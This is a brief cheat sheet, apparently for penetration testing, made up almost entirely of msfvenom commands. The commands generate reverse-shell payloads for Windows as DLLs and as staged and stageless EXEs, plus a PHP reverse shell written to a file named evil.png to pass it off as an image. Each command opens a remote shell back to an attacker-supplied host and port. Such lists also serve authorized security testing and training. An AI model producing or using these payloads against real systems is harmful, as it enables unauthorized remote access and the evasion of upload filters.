### :open_file_folder: Reference resources

https://www.revshells.com/

https://book.hacktricks.xyz/shells/shells/msfvenom

### :open_file_folder: Windows

- dll

x86(try first)

```
msfvenom -p windows/shell_reverse_tcp -f dll LHOST=<IP> LPORT=<PORT> -o xxx.dll
```

x64

```
msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=<IP> LPORT=<PORT> -o xxx.dll
```

- exe

Staged Payloads for Windows

x86

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x86.exe
```

x64

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x64.exe
```

Stageless Payloads for Windows(try first)

x86

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x86.exe
```

x64

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x64.exe
```

### :open_file_folder: PHP

```
msfvenom -p php/reverse_php LHOST=<local ip> LPORT=<local port> -f raw -b '"' > evil.png
echo -e "<?php $(cat evil.png)" > evil.png 
```
